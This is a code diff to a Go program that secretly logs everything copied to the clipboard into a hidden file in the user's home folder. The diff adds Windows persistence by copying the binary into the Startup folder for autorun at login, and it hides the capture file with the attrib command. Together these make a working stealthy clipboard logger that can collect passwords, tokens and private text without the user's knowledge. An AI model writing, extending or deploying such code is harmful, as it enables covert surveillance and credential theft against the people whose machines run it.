@@ -2,9 +2,14 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"runtime"
 	"time"
+
+	//"syscall"
 
 	"github.com/atotto/clipboard"
 )
@@ -20,11 +25,27 @@ func main() {
 	check(err)
 
 	hiddenFile := filepath.Join(homeDir, ".clipboard_capture")
+
+	// Set up persistence at boot-time (windows)
+	err = setupPersistence()
+	check(err)
+
+	// Create the .clipboard_capture file
+	f, err := os.OpenFile(hiddenFile, os.O_CREATE|os.O_WRONLY, 0600)
+	check(err)
+	f.Close()
+
+	// Hide the .clipboard_capture file on Windows
+	if runtime.GOOS == "windows" {
+		err := hideFile(hiddenFile)
+		check(err)
+	}
 	
-	// start clipboard reading loop
+	// Start reading clipboard
 	readClipboard(ticker, hiddenFile)
 }
 
+// readClipboard polls the clipboard at intervals and stores new clipboard data to disk
 func readClipboard(ticker *time.Ticker, hiddenFile string) {
 	var last string
 
@@ -43,6 +64,7 @@ func readClipboard(ticker *time.Ticker, hiddenFile string) {
 	}
 }
 
+// storeClipboard appends clipboard data to .clipboard_capture file
 func storeClipboard(path, data string) {
 	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	check(err)
@@ -54,12 +76,57 @@ func storeClipboard(path, data string) {
 	check(err)
 }
 
+// setupPersistence copies the binary to the Windows Startup folder for autorun at login
+func setupPersistence() error {
+	appData := os.Getenv("APPDATA")
+	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
+		err = os.MkdirAll(startupDir, 0755)
+		check(err)
+	}
+
+	binaryPath, err := os.Executable()
+	check(err)
+	binaryName := filepath.Base(binaryPath)
+	targetPath := filepath.Join(startupDir, binaryName)
+
+	// Copy binary if not already present
+	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
+		err := copyBinary(binaryPath, targetPath)
+		check(err)
+	}
+	return nil
+}
+
+// copyBinary copies a file from src to dst with 0755 permissions
+func copyBinary(src, dst string) error {
+	in, err := os.Open(src)
+	check(err)
+	defer in.Close()
+
+	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY, 0755)
+	check(err)
+	defer out.Close()
+
+	_, err = io.Copy(out, in)
+	check(err)
+	return nil
+}
+
+// hideFile sets the hidden attribute on a file in Windows
+func hideFile(path string) error {
+	cmd := exec.Command("attrib", "+H", path)
+	return cmd.Run()
+}
+
+// check panics or exits if err is non-nil
 func check(err error) {
 	if err != nil {
 		panic(err)
 	}
 }
 
+// summarize truncates long clipboard strings for readable output
 func summarize(s string) string {
 	// Keep output readable: show up to 300 chars
 	if len(s) > 300 {
@@ -67,4 +134,14 @@ func summarize(s string) string {
 	}
 	return s
 }
+
+// // hideFile sets the hidden attribute on a file in Windows (used if build from Windows)
+// func hideFile(path string) error{
+// 	if runtime.GOOS != "windows" {
+// 		path, err := syscall.UTF16PtrFromString(path)
+// 		err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN)
+// 		check(err)
+// 	}
+// 	return nil
+// }
 
